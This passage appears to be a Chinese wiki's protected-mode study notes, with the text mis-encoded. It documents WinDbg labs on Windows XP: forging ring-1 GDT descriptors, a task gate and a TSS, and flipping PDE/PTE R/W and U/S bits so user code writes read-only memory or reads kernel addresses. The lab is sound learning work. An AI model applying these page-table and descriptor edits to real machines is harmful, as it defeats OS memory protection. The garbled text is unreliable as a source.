æ®µ1148003f02000cff300`0000ffff1æœ‰æ•ˆ1ï¼œ8ï¼Œ0011æ•°æ®æ®µ11cs:0x08ï¼Œ0ç¯ï¼Œindexæ˜¯1ï¼Œå¯¹åº”çš„æ®µæè¿°ç¬¦æ˜¯00cf9b00`0000ffffï¼Œæ”¹DPLä¸º01åä¸ºï¼Œ00cfbb00`0000ffffss:0x10ï¼Œ0ç¯ï¼Œindexæ˜¯2ï¼Œå¯¹åº”çš„æ®µæè¿°ç¬¦æ˜¯00cf9300`0000ffffï¼Œæ”¹DPLä¸º01åä¸ºï¼Œ00cfb300`0000ffffåœ¨GDTè¡¨ä¸­æ‰¾ä¸¤ä¸ªæ— æ•ˆçš„æ®µæè¿°ç¬¦å†™å…¥ï¼Œæ‰¾çš„åºå·åœ°å€æ®µæè¿°ç¬¦Pä½æœ‰æ•ˆoræ— æ•ˆSä½188003f09000000000`000000000æ— æ•ˆ0198003f09800000000`000000000æ— æ•ˆ0åºå·18çš„æ”¹ä¸º1ç¯çš„ä»£ç æ®µï¼š1eq 8003f090 00cfbb00`0000ffffåºå·19çš„æ”¹ä¸º1ç¯çš„æ•°æ®æ®µï¼š1eq 8003f098 00cfb300`0000ffffæ‰€ä»¥æ„é€ çš„1ç¯cså’Œssæ˜¯ï¼šcsssindex1819TI00CPL0101æŒ‰å­—æ®µæ‹†0000 0000 1001 0 0 010000 0000 1001 1 0 01åå…­è¿›åˆ¶0000 0000 1001 00010000 0000 1001 10010x910x99fsçœ‹çš„ä¸¤ç¯‡å‚è€ƒæ–‡ç« éƒ½æ„é€ äº†fsï¼Œæ²¡å¤ªæ˜ç™½ï¼Œåé¢åº”è¯¥ä¼šå­¦åˆ°fsã€‚è¿™é‡Œæˆ‘ä¹Ÿåˆ†ææ”¹ä¸€ä¸‹ï¼Œä½†åˆ†æè¿‡ç¨‹ä¸çŸ¥é“å¯¹ä¸å¯¹ã€‚fs:0x3Bfs:0x30å‡ ç¯3ç¯0ç¯åå…­è¿›åˆ¶0000 0000 0011 10110000 0000 0011 0000æŒ‰å­—æ®µæ‹†0000 0000 0011 1 0 110000 0000 0011 0 0 00Index76TI00CPL30åºå·åœ°å€æ®µæè¿°ç¬¦Pä½æœ‰æ•ˆoræ— æ•ˆSä½TYPEåŸŸï¼ˆç¬¬ä¸‰ä¸ªåå…­è¿›åˆ¶æ•°ï¼‰æ•°æ®æ®µorä»£ç æ®µDPL68003f030ffc093df`f00000011æœ‰æ•ˆ1ï¼œ8ï¼Œ0011æ•°æ®æ®µ0078003f0380040f300`00000fff1æœ‰æ•ˆ1ï¼œ8ï¼Œ0011æ•°æ®æ®µ11fs:0x30ï¼Œ0ç¯ï¼Œindexæ˜¯6ï¼Œå¯¹åº”çš„æ®µæè¿°ç¬¦æ˜¯ffc093df`f0000001ï¼Œæ”¹DPLä¸º01åä¸ºï¼Œffc0b3df`f0000001åœ¨GDTè¡¨ä¸­æ‰¾ä¸ªæ— æ•ˆçš„æ®µæè¿°ç¬¦å†™å…¥ï¼Œæ‰¾çš„åºå·åœ°å€æ®µæè¿°ç¬¦Pä½æœ‰æ•ˆoræ— æ•ˆSä½218003f0a800000000`000000000æ— æ•ˆ0åºå·21çš„æ”¹ä¸º1ç¯fsç”¨ï¼š1eq 8003f0a8 ffc0b3df`f0000001æ‰€ä»¥æ„é€ çš„1ç¯fsæ˜¯ï¼šfsindex21TI0CPL01æŒ‰å­—æ®µæ‹†0000 0000 1010 1 0 01åå…­è¿›åˆ¶0000 0000 1010 00010xa9ä»»åŠ¡é—¨æ®µæè¿°ç¬¦ï¼Œæ”¹IDTè¡¨åŒã€Šè¯¾åç»ƒä¹ é¢˜ã€‹1eq 8003f500 0000e500`004b0000TSSæ®µæè¿°ç¬¦ï¼Œæ”¹GDTè¡¨åŒã€Šè¯¾åç»ƒä¹ é¢˜ã€‹ï¼Œæ ¹æ®ç»ˆç«¯æç¤ºçš„è¾“å‡ºæ¥æ”¹å’Œä»»åŠ¡é—¨è¯¾åç»ƒä¹ é¢˜ä»£ç å¯¹æ¯”å®Œæ•´ä»£ç 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD dwOK;DWORD dwESP;DWORD dwCS;void __declspec(naked) func() &#123; dwOK=1; __asm &#123; //int 3 mov eax,esp mov dwESP,eax //å­˜ä»»åŠ¡åˆ‡æ¢åçš„espçš„å€¼ mov word ptr [dwCS],cs //å­˜ä»»åŠ¡åˆ‡æ¢åcsçš„å€¼ iretd &#125;&#125;int main()&#123; char stack[100]=&#123;0&#125;; //æ‰¾äº†ä¸€ä¸ªå±€éƒ¨å˜é‡çš„åœ°å€å½“å †æ ˆå †æ ˆç”¨ DWORD cr3=0; //æ„é€ TSSï¼Œæ³¨é‡Šæ ‡æœ‰*è¯´æ˜ä¸ºå¿…å¡«å€¼ DWORD tss[0x68]=&#123; //0x68ï¼Œ104å­—èŠ‚ 0x00000000, //linkï¼Œä¸Šä¸€ä¸ªä»»åŠ¡çš„TRæ®µé€‰æ‹©å­ã€‚åœ¨å‘ç”Ÿä»»åŠ¡åˆ‡æ¢æ—¶CPUä¼šè‡ªåŠ¨å¡«å…… 0x00000000, //esp0 0x00000000, //ss0 0x00000000, //esp1 0x00000000, //ss1 0x00000000, //esp2 0x00000000, //ss2 cr3, //cr3* (DWORD)func, //eip * è·³è½¬çš„åœ°å€ 0x00000000, //eflags 0x00000000, //eax 0x00000000, //ecx 0x00000000, //edx 0x00000000, //ebx ((DWORD)stack) + 100, //esp * 0x00000000, //ebp 0x00000000, //esi 0x00000000, //edi 0x00000023, //es * + 0x00000091, //cs * 1ç¯ï¼š0x91+ 0x00000099, //ss * 1ç¯ï¼š0x99 0x00000023, //ds *+ 0x000000a9, //fs * 1ç¯ï¼š0xa9 0x00000000, //gs 0x00000000, //ldt 0x20ac0000 //IOæƒé™ä½å›¾ï¼ŒVISTAä¹‹åä¸å†ç”¨äº†ï¼Œè¿™æ˜¯ä»ç°æœ‰çš„TSSç»“æ„ä½“æ‹·å‡ºæ¥çš„ &#125;; //è¾“å‡ºçœ‹((DWORD)stack) + 100çš„åœ°å€ï¼Œåé¢ç”¨windbgçœ‹ä»»åŠ¡åˆ‡æ¢çš„espä½œå¯¹æ¯”ç”¨ printf(&quot;Address of the ((DWORD)stack) + 100 :%p &quot;,((DWORD)stack) + 100); //ä¿®æ”¹GDTè¡¨ printf(&quot;Address of the tss array: %p &quot;, tss); // Print the 1st (leftmost) hexadecimal digit, 2nd hexadecimal digit, and the low 16 bits of the tss array address printf(&quot;1st Hex Digit: %02x, 2nd Hex Digit: %02x, Low 16 bits: %04x &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (DWORD)tss &amp; 0x0000FFFF); printf(&quot;In WinDbg, modify your constructed Task Segment Descriptor in the GDT table using the following command: eq 8003f048 %02x00e9%02x`%04x0068 &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (WORD)tss); //å› ä¸ºå˜é‡å£°æ˜é¡ºåºçš„é—®é¢˜ï¼Œè¾“å…¥cr3çš„è¯­å¥åœ¨è¿™é‡Œã€‚ç„¶åå†èµ‹ç»™tssæ•°ç»„é‡Œçš„cr3å­—æ®µ printf(&quot;After running this executable, execute !process 0 0 in WinDbg, copy the value of DirBase for the TSS.exe process, and input it below. CR3: &quot;); scanf(&quot;%x&quot;,&amp;cr3); //æ‰§è¡Œè¯¥exeåï¼Œåœ¨WinDbgä¸­ç”¨è¯¥æŒ‡ä»¤è·å–ï¼š!process 0 0 tss[7]=cr3; __asm &#123; int 0x20 //ç´¢å¼•å·32ï¼Œ8003f500 //eq 8003f500 0000e500`004b0000 &#125; printf(&quot;ok = %x ESP = %x CS = %x &quot;,dwOK,dwESP,dwCS); return 0;&#125;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD dwOK;DWORD dwESP;DWORD dwCS;void __declspec(naked) func() &#123; dwOK=1; __asm &#123; //int 3 mov eax,esp mov dwESP,eax //å­˜ä»»åŠ¡åˆ‡æ¢åçš„espçš„å€¼ mov word ptr [dwCS],cs //å­˜ä»»åŠ¡åˆ‡æ¢åcsçš„å€¼ iretd &#125;&#125;int main()&#123; char stack[100]=&#123;0&#125;; //æ‰¾äº†ä¸€ä¸ªå±€éƒ¨å˜é‡çš„åœ°å€å½“å †æ ˆå †æ ˆç”¨ DWORD cr3=0; //æ„é€ TSSï¼Œæ³¨é‡Šæ ‡æœ‰*è¯´æ˜ä¸ºå¿…å¡«å€¼ DWORD tss[0x68]=&#123; //0x68ï¼Œ104å­—èŠ‚ 0x00000000, //linkï¼Œä¸Šä¸€ä¸ªä»»åŠ¡çš„TRæ®µé€‰æ‹©å­ã€‚åœ¨å‘ç”Ÿä»»åŠ¡åˆ‡æ¢æ—¶CPUä¼šè‡ªåŠ¨å¡«å…… 0x00000000, //esp0 0x00000000, //ss0 0x00000000, //esp1 0x00000000, //ss1 0x00000000, //esp2 0x00000000, //ss2 cr3, //cr3* (DWORD)func, //eip * è·³è½¬çš„åœ°å€ 0x00000000, //eflags 0x00000000, //eax 0x00000000, //ecx 0x00000000, //edx 0x00000000, //ebx ((DWORD)stack) + 100, //esp * 0x00000000, //ebp 0x00000000, //esi 0x00000000, //edi 0x00000023, //es * 0x00000091, //cs * 1ç¯ï¼š0x91 0x00000099, //ss * 1ç¯ï¼š0x99 0x00000023, //ds * 0x000000a9, //fs * 1ç¯ï¼š0xa9 0x00000000, //gs 0x00000000, //ldt 0x20ac0000 //IOæƒé™ä½å›¾ï¼ŒVISTAä¹‹åä¸å†ç”¨äº†ï¼Œè¿™æ˜¯ä»ç°æœ‰çš„TSSç»“æ„ä½“æ‹·å‡ºæ¥çš„ &#125;; //è¾“å‡ºçœ‹((DWORD)stack) + 100çš„åœ°å€ï¼Œåé¢ç”¨windbgçœ‹ä»»åŠ¡åˆ‡æ¢çš„espä½œå¯¹æ¯”ç”¨ printf(&quot;Address of the ((DWORD)stack) + 100 :%p &quot;,((DWORD)stack) + 100); //ä¿®æ”¹GDTè¡¨ printf(&quot;Address of the tss array: %p &quot;, tss); // Print the 1st (leftmost) hexadecimal digit, 2nd hexadecimal digit, and the low 16 bits of the tss array address printf(&quot;1st Hex Digit: %02x, 2nd Hex Digit: %02x, Low 16 bits: %04x &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (DWORD)tss &amp; 0x0000FFFF); printf(&quot;In WinDbg, modify your constructed Task Segment Descriptor in the GDT table using the following command: eq 8003f048 %02x00e9%02x`%04x0068 &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (WORD)tss); //å› ä¸ºå˜é‡å£°æ˜é¡ºåºçš„é—®é¢˜ï¼Œè¾“å…¥cr3çš„è¯­å¥åœ¨è¿™é‡Œã€‚ç„¶åå†èµ‹ç»™tssæ•°ç»„é‡Œçš„cr3å­—æ®µ printf(&quot;After running this executable, execute !process 0 0 in WinDbg, copy the value of DirBase for the TSS.exe process, and input it below. CR3: &quot;); scanf(&quot;%x&quot;,&amp;cr3); //æ‰§è¡Œè¯¥exeåï¼Œåœ¨WinDbgä¸­ç”¨è¯¥æŒ‡ä»¤è·å–ï¼š!process 0 0 tss[7]=cr3; __asm &#123; int 0x20 //ç´¢å¼•å·32ï¼Œ8003f500 //eq 8003f500 0000e500`004b0000 &#125; printf(&quot;ok = %x ESP = %x CS = %x &quot;,dwOK,dwESP,dwCS); return 0;&#125;æ€»ç»“ä¸€ä¸‹è¦æ”¹çš„æ®µæè¿°ç¬¦è¿è¡Œæ”¹GDTè¡¨æŒ‡ä»¤ç”¨é€”eq 8003f090 00cfbb00`0000ffff1ç¯ä»£ç æ®µï¼Œcs:0x91eq 8003f098 00cfb300`0000ffff1ç¯æ•°æ®æ®µï¼Œå½“å †æ ˆç”¨ï¼Œss:0x99eq 8003f0a8 ffc0b3df`f00000011ç¯fsç”¨ï¼Œfs:0xa9çœ‹ç»ˆç«¯è¾“å‡ºTSSæ®µæè¿°ç¬¦æ”¹IDTè¡¨æŒ‡ä»¤ç”¨é€”eq 8003f500 0000e500`004b0000ä»»åŠ¡é—¨æ®µæè¿°ç¬¦ï¼Œint 0x20ç¼–è¯‘è¿è¡Œwindbgä¸‹æ–­ï¼Œæ”¹GDTè¡¨å’ŒIDTè¡¨GDTè¡¨ï¼š1eq 8003f090 00cfbb00`0000ffff1eq 8003f098 00cfb300`0000ffff1eq 8003f0a8 ffc0b3df`f00000011eq 8003f048 0000e912`fd78006812345678910111213141516171819202122232425262728kd&gt; dq 8003f000 L168003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`000000008003f050 80008954`af000068 80008954`af6800688003f060 00009302`2f40ffff 0000920b`80003fff8003f070 ff0092ff`700003ff 80009a40`0000ffff8003f080 80009240`0000ffff 00009200`000000008003f090 00000000`00000000 00000000`000000008003f0a0 8600893b`03500068 00000000`00000000kd&gt; eq 8003f090 00cfbb00`0000ffffkd&gt; eq 8003f098 00cfb300`0000ffffkd&gt; eq 8003f0a8 ffc0b3df`f0000001kd&gt; eq 8003f048 0000e912`fd780068kd&gt; dq 8003f000 L168003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 0000e912`fd7800688003f050 80008954`af000068 80008954`af6800688003f060 00009302`2f40ffff 0000920b`80003fff8003f070 ff0092ff`700003ff 80009a40`0000ffff8003f080 80009240`0000ffff 00009200`000000008003f090 00cfbb00`0000ffff 00cfb300`0000ffff8003f0a0 8600893b`03500068 ffc0b3df`f0000001IDTè¡¨ï¼š1eq 8003f500 0000e500`004b000012345678910111213141516171819202122232425262728293031323334353637kd&gt; dq 8003f400 L218003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 00000000`00080000kd&gt; eq 8003f500 0000e500`004b0000kd&gt; dq 8003f400 L218003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 0000e500`004b0000ä½¿ç”¨!process 0 0æŸ¥çœ‹è¯¥exeçš„DirBaseï¼Œè¾“å…¥åˆ°ç»ˆç«¯csæ˜¯è‡ªå·±æ„é€ çš„1ç¯ï¼Œè¿è¡Œè¿‡ç¨‹æ²¡è“å±ï¼Œå®éªŒæˆåŠŸåŠ ä¸Šint 3ï¼Œæ‰§è¡Œ1234567891011121314void __declspec(naked) func() &#123; dwOK=1; __asm &#123;+ int 3 mov eax,esp mov dwESP,eax //å­˜ä»»åŠ¡åˆ‡æ¢åçš„espçš„å€¼ mov word ptr [dwCS],cs //å­˜ä»»åŠ¡åˆ‡æ¢åcsçš„å€¼ iretd &#125;&#125;windbgæŠ¥é”™123456789101112131415161718192021*** Fatal System Error: 0x0000007f (0x00000008,0x80042000,0x00000000,0x00000000)Break instruction exception - code 80000003 (first chance)A fatal system error has occurred.Debugger entered on first try; Bugcheck callbacks have not been invoked.A fatal system error has occurred.Connected to Windows XP 2600 x86 compatible target at (Tue Aug 15 14:42:04.436 2023 (UTC + 8:00)), ptr64 FALSELoading Kernel Symbols.............................................................................Press ctrl-c (cdb, kd, ntsd) or ctrl-break (windbg) to abort symbol loads that take too long.Run !sym noisy before .reload to track down problems loading symbols.............................WARNING: Process directory table base 0C640380 doesn&#x27;t match CR3 00B18000WARNING: Process directory table base 0C640380 doesn&#x27;t match CR3 00B18000.....è¯•äº†VCåœ¨int 0x20ä¸‹æ–­ç‚¹ï¼Œå•æ­¥ï¼Œæƒ…å†µä¸€æ ·ã€‚ä¼°è®¡æ²¡æ³•è°ƒå°ç»“å®éªŒä¸­è¿›1ç¯ç”¨çš„æ˜¯TSSä¸­çš„sså’Œespï¼Œè€Œä¸æ˜¯ss1å’Œesp1ã€‚æ‘˜æŠ„ï¼šesp 0 1 2çš„ä½œç”¨æ˜¯ç”¨æ¥æŒ‡å®š ä½ ä½¿ç”¨ä»»åŠ¡é—¨è¿›1ç¯åå¦‚æœå†å‘ç”Ÿç”±ä¸­æ–­ï¼Œè°ƒç”¨é—¨ï¼Œé™·é˜±é—¨äº§ç”Ÿçš„æƒé™åˆ‡æ¢çš„å †æ ˆï¼›ä½¿ç”¨ä»»åŠ¡æ®µä»»åŠ¡é—¨æœ¬èº«è¿‡ç¨‹ä¸­å †æ ˆæ˜¯ç”±ESPå’ŒSSæ¥å†³å®šçš„ï¼Œå’ŒESP 0 1 2æ²¡å…³ç³»æ‘˜æŠ„è‡ªè¯„è®ºåŒºMr.hackï¼šä»»åŠ¡é—¨è¿›1ç¯-çœ‹é›ª"},{"title":"PDEã€PTEå±æ€§","path":"/wiki/Protected_Mode/PDEã€PTEå±æ€§.html","content":"PDEã€PTEå±æ€§ ç‰©ç†é¡µçš„å±æ€§ç”±PDEå’ŒPTEå…±åŒå†³å®šï¼Œç‰©ç†é¡µçš„å±æ€§=PDEå±æ€§&amp;PTEå±æ€§ã€‚ é«˜20ä½ï¼Œç‰©ç†åœ°å€ï¼Œ12ä½ï¼Œå±æ€§ã€‚ æ˜¯ç‰©ç†åœ°å€ï¼Œæƒ³æƒ³ä¹‹å‰åœ¨windbgæ ¹æ®CR3+10*4ï¼Œå¾—åˆ°PDEåï¼Œè¿˜æ˜¯ç”¨!ddæŒ‡ä»¤æŸ¥ï¼Œ!ddæŸ¥çš„å°±æ˜¯ç‰©ç†åœ°å€ã€‚ PDE PTEå12ä½ï¼ˆäºŒè¿›åˆ¶ä½ï¼Œ3ä¸ª16è¿›åˆ¶ä½ï¼‰å­˜å‚¨ç€å±æ€§ï¼Œä¸¤è€…çš„å±æ€§å­—æ®µå’Œå±æ€§å€¼å¾ˆå¤šéƒ½æ˜¯ä¸€æ ·çš„ã€‚é‡å¤çš„å±æ€§å­—æ®µï¼Œè¦è¿›è¡Œä¸æ“ä½œï¼Œä¸¤è€…éƒ½ä¸º1ï¼Œå¯¹åº”ç‰©ç†é¡µçš„è¯¥å±æ€§æ‰ä¸º1ã€‚ ä¸ºä»€ä¹ˆæ²¡æœ‰å¯æ‰§è¡Œå±æ€§çš„ä½ï¼Ÿ è®¾è®¡é—®é¢˜ï¼Œåœ¨2-9-9-12åˆ†é¡µè¡¥ä¸Šäº†è¿™ä¸ªç¼ºé™·ã€‚ Pä½ æœ‰æ•ˆä½ï¼Œè¡¨ç¤ºPDEæˆ–PTEæ˜¯å¦æœ‰æ•ˆã€‚ å€¼ å«ä¹‰ 1 æœ‰æ•ˆ 0 æ— æ•ˆ ä¸º1ï¼Œç‰©ç†é¡µå°±å­˜åœ¨ã€‚ä¸º0ï¼Œç‰©ç†é¡µä¸å­˜åœ¨ã€‚ R/Wä½ è¯»å†™ä½ã€‚åªæœ‰å½“PDEå’ŒPTEçš„R/Wä½éƒ½ä¸º1çš„æ—¶å€™ï¼Œè¯¥ç‰©ç†é¡µæ‰æ˜¯å¯è¯»å¯å†™çš„ã€‚åªè¦æœ‰ä¸€ä¸ªä¸º0ä»£è¡¨åªè¯»ä¸å¯å†™ã€‚ å€¼ å«ä¹‰ 1 å¯è¯»å¯å†™ 0 åªè¯»ä¸å¯å†™ å¯¹äºéVTè€Œè¨€ï¼Œä¸€å—å†…å­˜ç”³è¯·å‡ºæ¥ï¼Œå®ƒå¿…ç„¶æ˜¯å¯è¯»çš„ã€‚ å®éªŒï¼šå®šä¹‰ä¸€ä¸ªåªè¯»ç±»å‹çš„å˜é‡ï¼Œç”¨å¦ä¸€ä¸ªçº¿æ€§åœ°å€æŒ‡å‘ç›¸åŒçš„ç‰©ç†é¡µï¼Œé€šè¿‡ä¿®æ”¹PDE/PTEå±æ€§ï¼Œå®ç°å¯å†™ã€‚æµ‹è¯•ä»£ç æ­£å¸¸æ‰§è¡Œgetcharæ—¶ä¿®æ”¹R/Wä½12345678910111213141516171819#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123;\tchar* str = &quot;Hello World&quot;; //å¸¸é‡åŒºï¼Œåªè¯»ä¸èƒ½å†™\tDWORD dwVal = (DWORD)str; printf(&quot;çº¿æ€§åœ°å€:%x &quot;,str); //ä¿®æ”¹R/Wä½ï¼Œæ”¹ä¸ºå¯å†™\tgetchar(); //str[1]=&#x27;M&#x27;;\t*(char*)dwVal = &#x27;M&#x27;;\tprintf(&quot;ä¿®æ”¹åçš„å­—ç¬¦ä¸²ï¼š%s &quot;,str);\treturn 0;&#125;strè¿™ä¸ªå­—ç¬¦ä¸²å­˜å‚¨åœ¨PEçš„å¸¸é‡åŒºä¸­ï¼Œåªè¯»ä¸å¯å†™ã€‚ç›´æ¥æ‰§è¡Œä¼šæŠ¥é”™çš„ï¼Œ0xC0000005ï¼ŒAccess Violationã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬æ›´æ”¹ç‰©ç†é¡µå¯¹åº”çš„PDEå’ŒPTEçš„R/Wå±æ€§åï¼Œå°±å¯ä»¥æˆåŠŸæ”¹å†™ã€‚1! process 0 0CR3æ˜¯19b890001234çº¿æ€§åœ°å€423044æ‹†åˆ†0000 0000 01 //10 ;1*4=400 0010 0011,23 //10 ;23*4=8C044 //12123!dd 19b89000+4!dd 19d5d000+8C!ed 19d5d08c 19df4027å›åˆ°è™šæ‹Ÿæœºåï¼Œå›è½¦ï¼Œä¿®æ”¹æˆåŠŸ U/Sä½ userï¼Œsystem ç‰¹æƒç­‰çº§ä½ã€‚ ç±»åˆ« å‡ ç¯ å¯ä»¥è®¿é—® ç³»ç»Ÿç¯ 0 1 2 ç³»ç»Ÿé¡µå’Œç”¨æˆ·é¡µ ç”¨æˆ·ç¯ 3 ç”¨æˆ·é¡µ 0ç¯æ˜¯ç‰¹æƒçº§ç¯ï¼Œ1ã€2ç¯è™½ç„¶ä¸æ˜¯ç‰¹æƒçº§ç¯ï¼Œä½†æ˜¯æ˜¯ç³»ç»Ÿç¯ï¼Œæ‰€ä»¥å¯ä»¥è®¿é—®ç³»ç»Ÿé¡µå’Œç”¨æˆ·é¡µã€‚ å€¼ å«ä¹‰ 1 æ™®é€šç”¨æˆ·å³å¯è®¿é—®ï¼Œå³3ç¯æƒé™ 0 åªå…è®¸ç‰¹æƒç”¨æˆ·ï¼ˆsuper userï¼‰è®¿é—®ï¼Œå³é3ç¯æƒé™ åœ¨åº”ç”¨å±‚å†™ä»£ç æ— æ³•è®¿é—®8å¼€å¤´å†…å­˜åœ°å€ï¼ˆ2Gä»¥ä¸Šï¼‰çš„åŸå› ï¼š U/Sä½è®¾ç½®é—®é¢˜ï¼Œå¦‚æœå°†å†…æ ¸çš„æŸä¸ªé¡µè®¾ç½®ä¸º1å°±å¯ä»¥åœ¨R3è®¿é—®äº†ã€‚ windowsæ“ä½œç³»ç»Ÿå¯åŠ¨æ—¶ä¸€èˆ¬è¿™ä¹ˆè®¾ç½®ï¼š 0-7FFFFFFF U/S=1ï¼ˆè¿™ä¸ªåŒºåŸŸè¿˜æœ‰ä¸¤æ®µç©ºç™½åŒºï¼Œå…ˆç®€å•è¿™ä¹ˆç†è§£ï¼‰ 80000000-FFFFFFFF U/S=0 å®éªŒï¼šä¿®æ”¹ä¸€ä¸ªé«˜2Gçº¿æ€§åœ°å€çš„PDE/PTEå±æ€§,å®ç°Ring3å¯è¯»ã€‚æ¯”å¦‚:0x8003F00Cä»£ç æ‰§è¡Œä¿®æ”¹U/Sä½åæ‰§è¡Œ123456789101112#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123;\tPDWORD p = (PDWORD)0x8003F00C;\tgetchar();\tprintf(&quot;è¯»é«˜2Gåœ°å€0x8003F00Cï¼š%x &quot;,*p);\treturn 0;&#125;ç›´æ¥æ‰§è¡ŒæŠ¥é”™ï¼Œ0xC0000005ï¼ŒAccess Violationã€‚è¿è¡Œï¼Œgetcharåœä½åã€‚windbgä¸‹æ–­ï¼Œæ”¹U/Sä½1bf1e0001234çº¿æ€§åœ°å€8003F00Cæ‹†åˆ†1000000000,200 //10 ;200*4=8000000111111,3F //10 ;3F*4=FC00C //1212345! process 0 0!dd 1bf1e000+800!ed 1bf1e800 0003b167!dd 0003b000+FC!ed 3b0fc 0003f167 PSä½ï¼ˆPageSizeï¼‰ è¿™ä¸ªä½åªå¯¹PDEæœ‰æ„ä¹‰ã€‚ å€¼ å«ä¹‰ 1 PDEç›´æ¥æŒ‡å‘ç‰©ç†é¡µï¼Œä¸å†æŒ‡å‘PTEã€‚çº¿æ€§åœ°å€ä½22ä½æ˜¯é¡µå†…åç§»ï¼Œå®ƒçš„å¤§å°ä¸º4MBï¼Œä¿—ç§°â€œå¤§é¡µâ€ã€‚ 0 4KBå°é¡µï¼Œ PDE=1æ—¶ï¼ŒPDEå‰20ä½ï¼ˆäºŒè¿›åˆ¶æ•°ï¼Œ5ä½åå…­è¿›åˆ¶ï¼‰å°±æ˜¯ç‰©ç†é¡µåœ°å€ï¼Œçº¿æ€§åœ°å€ä½22ä½å°±æ˜¯åç§»ã€‚ å®éªŒï¼šä»¥0x8043f00cä¸ºä¾‹ï¼Œåˆ†æPS=1çš„æƒ…å†µã€‚éšä¾¿å¼€ä¸ªè¿›ç¨‹ï¼Œæ¯”å¦‚notepadï¼Œwindbgä¸‹æ–­ï¼ŒæŸ¥CR312çº¿æ€§åœ°å€8043f00cæ‹†åˆ†1000000001,201 //10 ;201*4=804æŸ¥åˆ°çš„PDEæ˜¯004001e3ï¼ŒPSä½ä¸º1ã€‚æ‰€ä»¥çº¿æ€§åœ°å€ä½22ä½æ˜¯ç‰©ç†é¡µåç§»e3ï¼š1110 0011PS0APCDPWTU/SR/WP11100011PS=1ï¼Œå¤§é¡µA=1ï¼Œè¢«è®¿é—®è¿‡è¢«å†™è¿‡ï¼Ÿå…¨å±€ï¼ŸU/S=0ï¼Œä»…ç³»ç»Ÿç”¨æˆ·å¯è®¿é—®R/W=1ï¼Œå¯è¯»å¯å†™P=1ï¼Œæœ‰æ•ˆä¿æŠ¤æ¨¡å¼ç¯‡â€”â€”PAEåˆ†é¡µ-ç¾½å¤çš„åšå®¢-ä¹ é¢˜31000011111100C,3F00C //22 ;ç‰©ç†é¡µåç§» Aä½ï¼ˆAccessï¼‰ æ˜¯å¦è¢«è®¿é—®ï¼ˆè¯»æˆ–è€…å†™ï¼‰è¿‡ï¼Œå¦‚æœè¢«è®¿é—®è¿‡åˆ™ç½®1ã€‚ å“ªæ€•æ˜¯1ä¸ªå­—èŠ‚çš„åœ°æ–¹è®¿é—®ä¹Ÿä¼šå°†å¯¹åº”PDEã€PTEçš„Aä½ç½®1 å€¼ å«ä¹‰ 1 è®¿é—®è¿‡ 0 æœªè®¿é—®è¿‡ Dä½ï¼ˆDirtyï¼‰ è„ä½ï¼Œæ˜¯å¦è¢«å†™è¿‡ã€‚ å€¼ å«ä¹‰ 1 è¢«å†™è¿‡ 0 æ²¡æœ‰è¢«å†™è¿‡ 9ã€10ã€11ä½ CPUæœªå®šä¹‰ï¼Œç•™ç»™æ“ä½œç³»ç»Ÿç”¨ã€‚æ“ä½œç³»ç»Ÿç”¨åœ¨ä»€ä¹ˆåœ°æ–¹äº†å‘¢ï¼Ÿå†…å­˜ç®¡ç†ç¼ºé¡µå¼‚å¸¸æ—¶ç”¨åˆ°ã€‚ ä»CPUçš„è§’åº¦çœ‹ï¼Œåªè¦è®¿é—®PDEã€PTEæ—¶ï¼ŒPä½ä¸º0ï¼Œå°±èµ°IDTè¡¨çš„eå·ä¸­æ–­ç¼ºé¡µå¼‚å¸¸ã€‚ç¼ºé¡µå¼‚å¸¸çš„å¤„ç†å‡½æ•°ï¼Œå…·ä½“å¤„ç†ç»†èŠ‚ï¼Œç”±æ“ä½œç³»ç»Ÿå†³å®šï¼Œå¤„ç†ç»†èŠ‚å¯¹CPUé€æ˜ã€‚ 